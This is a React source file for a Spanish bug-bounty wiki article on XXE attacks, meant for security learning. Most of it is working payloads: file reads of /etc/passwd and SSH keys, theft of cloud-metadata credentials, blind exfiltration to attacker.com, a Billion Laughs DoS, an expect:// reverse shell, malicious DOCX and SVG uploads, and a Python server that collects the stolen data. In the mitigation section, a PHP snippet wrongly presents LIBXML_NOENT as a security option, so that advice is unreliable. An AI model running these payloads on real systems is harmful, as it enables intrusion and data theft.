/**
 * XXE (XML EXTERNAL ENTITY)
 * Exfiltrar archivos via XML parsing
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { FileText, Database, Shield, AlertOctagon, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function XXEContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="XXE - Cuando el Parser XML es tu Enemigo">
        <Paragraph>
          <Strong>XML External Entity (XXE)</Strong> explota parsers XML mal configurados 
          para leer archivos locales, ejecutar SSRF, o causar DoS. Afecta Java, PHP, .NET, 
          y cualquier aplicación que procese XML.
        </Paragraph>

        <AlertDanger title="Impacto Crítico">
          <ul className="mt-2 space-y-1">
            <ListItem>📁 Leer archivos locales (/etc/passwd, source code)</ListItem>
            <ListItem>🌐 SSRF (escanear red interna)</ListItem>
            <ListItem>💣 DoS (Billion Laughs attack)</ListItem>
            <ListItem>🔐 Robar AWS credentials (instance metadata)</ListItem>
            <ListItem>🎯 RCE via PHP expect:// wrapper</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="fundamentos" title="1. DTD y External Entities - Cómo Funciona">
        <Paragraph>
          XML permite definir <Strong>Document Type Definitions (DTD)</Strong> que incluyen 
          <Strong>ENTITY declarations</Strong>. Un parser vulnerable expande estas entidades, 
          permitiendo leer archivos arbitrarios.
        </Paragraph>

        <CodeBlock
          language="xml"
          title="XML válido con external entity"
          code={`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>

<!-- Cuando el parser expande &xxe;, lee /etc/passwd -->`}
        />

        <TerminalOutput title="Response con contenido de /etc/passwd">
          {`<foo>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</foo>`}
        </TerminalOutput>
      </Section>

      <Section id="exfiltrar-archivos" title="2. Exfiltrar Archivos Locales">
        <CodeBlock
          language="java"
          title="❌ VULNERABLE - Parser Java sin deshabilitar external entities"
          code={`import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;

public class XMLParser {
    public void parseXML(String xmlInput) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        
        // ❌ VULNERABLE - External entities habilitadas por defecto
        DocumentBuilder builder = factory.newDocumentBuilder();
        
        Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes()));
        
        // Procesar documento...
    }
}`}
        />

        <CodeBlock
          language="xml"
          title="Payload - Leer /etc/passwd"
          code={`POST /api/upload HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userInfo>
  <name>&xxe;</name>
</userInfo>`}
        />

        <CodeBlock
          language="xml"
          title="Variantes - Leer otros archivos sensibles"
          code={`<!-- Leer source code -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">

<!-- Leer SSH keys -->
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">

<!-- Leer cloud metadata (AWS) -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Leer Windows SAM -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/config/SAM">

<!-- Leer logs -->
<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">`}
        />
      </Section>

      <Section id="blind-xxe" title="3. Blind XXE - Exfiltración Out-of-Band">
        <Paragraph>
          Si el response no incluye el contenido de la entidad, usar <Strong>Out-of-Band</Strong> 
          exfiltration enviando datos a un servidor externo.
        </Paragraph>

        <CodeBlock
          language="xml"
          title="Payload - Blind XXE con DTD externo"
          code={`POST /api/parse HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<foo></foo>`}
        />

        <CodeBlock
          language="xml"
          title="evil.dtd en servidor del atacante"
          code={`<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/steal?data=%file;'>">

<!-- Cómo funciona:
1. Parser carga evil.dtd
2. %file expande a contenido de /etc/passwd
3. %send define nueva entidad %exfil
4. %exfil hace request HTTP con file data en query param
-->`}
        />

        <TerminalOutput title="Logs en attacker.com">
          {`GET /steal?data=root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1... HTTP/1.1
Host: attacker.com

# Contenido de /etc/passwd exfiltrado vía query parameter`}
        </TerminalOutput>
      </Section>

      <Section id="ssrf-via-xxe" title="4. SSRF via XXE">
        <CodeBlock
          language="xml"
          title="Payload - Escanear red interna"
          code={`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>
<foo>&xxe;</foo>

<!-- Probar puertos internos -->
<!ENTITY xxe SYSTEM "http://192.168.1.5:22">
<!ENTITY xxe SYSTEM "http://192.168.1.5:3306">  <!-- MySQL -->
<!ENTITY xxe SYSTEM "http://192.168.1.5:6379">  <!-- Redis -->
<!ENTITY xxe SYSTEM "http://192.168.1.5:27017"> <!-- MongoDB -->`}
        />

        <CodeBlock
          language="xml"
          title="Payload - Acceder a cloud metadata"
          code={`<!-- AWS Instance Metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name">

<!-- Google Cloud Metadata -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">

<!-- Azure Instance Metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text">`}
        />
      </Section>

      <Section id="billion-laughs" title="5. Billion Laughs Attack - DoS">
        <CodeBlock
          language="xml"
          title="Payload - Amplificación exponencial"
          code={`<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

<!-- 
Amplificación:
lol   = 3 bytes
lol1  = 30 bytes (10x lol)
lol2  = 300 bytes (10x lol1)
...
lol9  = 3 GB!

Parser consume GB de memoria → OOM crash
-->`}
        />
      </Section>

      <Section id="php-expect" title="6. RCE via PHP expect:// Wrapper">
        <Paragraph>
          En PHP con extensión <InlineCode>expect</InlineCode>, XXE puede escalar a RCE.
        </Paragraph>

        <CodeBlock
          language="xml"
          title="Payload - RCE en PHP"
          code={`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>

<!-- Comando 'id' ejecutado, output en response:
<foo>uid=33(www-data) gid=33(www-data) groups=33(www-data)</foo>
-->`}
        />

        <CodeBlock
          language="xml"
          title="Payload - Reverse shell"
          code={`<!ENTITY xxe SYSTEM "expect://bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'">

<!-- Resultado: Reverse shell conectado a attacker.com:4444 -->`}
        />
      </Section>

      <Section id="xxe-via-file-upload" title="7. XXE via File Upload (SVG, DOCX, XLSX)">
        <Subsection title="SVG File Upload">
          <CodeBlock
            language="xml"
            title="malicious.svg - XXE en upload de imágenes"
            code={`<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="35" fill="red">&xxe;</text>
</svg>

<!-- Subir este SVG en campo de avatar/logo
Cuando se procesa, /etc/passwd es renderizado en la imagen
-->`}
          />
        </Subsection>

        <Subsection title="DOCX File Upload">
          <Paragraph>
            Archivos DOCX/XLSX son ZIP con XML dentro. Modificar XML interno para XXE.
          </Paragraph>

          <CodeBlock
            language="bash"
            title="Crear DOCX malicioso"
            code={`# 1. Crear documento Word normal y guardarlo como .docx
# 2. Renombrar a .zip
mv document.docx document.zip

# 3. Extraer
unzip document.zip -d docx_extracted

# 4. Editar word/document.xml
cat > docx_extracted/word/document.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
EOF

# 5. Recomprimir
cd docx_extracted
zip -r ../malicious.docx *
cd ..

# 6. Subir malicious.docx
# Cuando el servidor procesa el documento, /etc/passwd es incluido`}
          />
        </Subsection>
      </Section>

      <Section id="herramientas" title="8. Herramientas de Explotación">
        <Subsection title="XXEinjector">
          <CodeBlock
            language="bash"
            title="XXEinjector - Automatizar explotación"
            code={`git clone https://github.com/enjoiz/XXEinjector
cd XXEinjector

# Modo básico - File read
ruby XXEinjector.rb \\
  --host=192.168.1.100 \\
  --path=/api/upload \\
  --file=/tmp/request.xml \\
  --oob=http \\
  --phpfilter

# Modo enumeración
ruby XXEinjector.rb \\
  --host=192.168.1.100 \\
  --path=/api/parse \\
  --file=/tmp/payload.xml \\
  --enumports

# Output:
[+] Port 22: OPEN (SSH)
[+] Port 80: OPEN (HTTP)
[+] Port 3306: OPEN (MySQL)`}
          />
        </Subsection>

        <Subsection title="DTD Server para Blind XXE">
          <CodeBlock
            language="python"
            title="Servidor HTTP para capturar datos"
            code={`from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class XXEHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parsear query parameters
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if 'data' in params:
            # Datos exfiltrados
            stolen = params['data'][0]
            print(f"\\n[+] EXFILTRATED DATA:\\n{stolen}\\n")
            
            with open('stolen.txt', 'a') as f:
                f.write(stolen + '\\n')
        
        # Servir evil.dtd
        if self.path == '/evil.dtd':
            dtd = '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP/steal?data=%file;'>">'''
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml-dtd')
            self.end_headers()
            self.wfile.write(dtd.encode())
        else:
            self.send_response(200)
            self.end_headers()

print('[*] Starting XXE server on port 8000...')
httpd = HTTPServer(('0.0.0.0', 8000), XXEHandler)
httpd.serve_forever()`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Prevenir XXE">
          Deshabilitar external entities en TODOS los parsers XML.
        </AlertDanger>

        <Subsection title="1. Java - Deshabilitar External Entities">
          <CodeBlock
            language="java"
            title="✅ SEGURO - DocumentBuilderFactory"
            code={`import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.XMLConstants;

public class SecureXMLParser {
    public Document parseXML(String xmlInput) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        
        // ✅ Deshabilitar DTDs completamente
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        
        // ✅ Deshabilitar external entities
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        
        // ✅ Deshabilitar entity expansion
        factory.setExpandEntityReferences(false);
        
        // ✅ Deshabilitar XInclude
        factory.setFeature("http://apache.org/xml/features/xinclude", false);
        
        // ✅ Secure processing
        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new ByteArrayInputStream(xmlInput.getBytes()));
    }
}`}
          />
        </Subsection>

        <Subsection title="2. PHP - libxml_disable_entity_loader()">
          <CodeBlock
            language="php"
            title="✅ SEGURO - PHP simplexml_load_string"
            code={`<?php
// ✅ Deshabilitar external entity loading
libxml_disable_entity_loader(true);

// ✅ Constantes de seguridad
$options = LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR;

// Parsear XML
$xml = simplexml_load_string(
    $xmlInput,
    'SimpleXMLElement',
    LIBXML_NOCDATA  // ✅ Solo esta opción segura
);

// Procesar...
?>`}
          />
        </Subsection>

        <Subsection title="3. .NET - XmlReaderSettings">
          <CodeBlock
            language="csharp"
            title="✅ SEGURO - .NET XmlReader"
            code={`using System.Xml;

public XmlDocument ParseXML(string xmlInput)
{
    XmlReaderSettings settings = new XmlReaderSettings();
    
    // ✅ Deshabilitar DTD processing
    settings.DtdProcessing = DtdProcessing.Prohibit;
    
    // ✅ Deshabilitar external resources
    settings.XmlResolver = null;
    
    // ✅ Limits
    settings.MaxCharactersInDocument = 10000000;
    
    XmlDocument doc = new XmlDocument();
    
    using (XmlReader reader = XmlReader.Create(new StringReader(xmlInput), settings))
    {
        doc.Load(reader);
    }
    
    return doc;
}`}
          />
        </Subsection>

        <Subsection title="4. Python - defusedxml">
          <CodeBlock
            language="python"
            title="✅ SEGURO - Usar defusedxml"
            code={`# Instalar
# pip install defusedxml

# ❌ INSEGURO
import xml.etree.ElementTree as ET
tree = ET.parse('untrusted.xml')  # VULNERABLE

# ✅ SEGURO - defusedxml
import defusedxml.ElementTree as ET

# Parsear con protecciones
tree = ET.parse('untrusted.xml')

# Alternativa con fromstring
import defusedxml.ElementTree as defused_ET
root = defused_ET.fromstring(xml_string)

# defusedxml automáticamente:
# - Bloquea external entities
# - Previene billion laughs
# - Limita entity expansion`}
          />
        </Subsection>

        <Subsection title="5. Validar Content-Type">
          <CodeBlock
            language="javascript"
            title="✅ Rechazar XML si no es esperado"
            code={`app.post('/api/upload', (req, res) => {
  const contentType = req.headers['content-type'];
  
  // ✅ Solo aceptar JSON
  if (contentType !== 'application/json') {
    return res.status(415).json({
      error: 'Unsupported Media Type. Only application/json accepted.'
    });
  }
  
  // Procesar JSON (no XML)
  const data = req.body;
  // ...
});

// Si XML es necesario:
const allowedContentTypes = ['application/xml', 'text/xml'];

if (!allowedContentTypes.includes(contentType)) {
  return res.status(415).json({ error: 'Invalid Content-Type' });
}

// Y usar parser seguro`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: SSTI (Server-Side Template Injection)</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/ssti`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Inyectar código en template engines</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
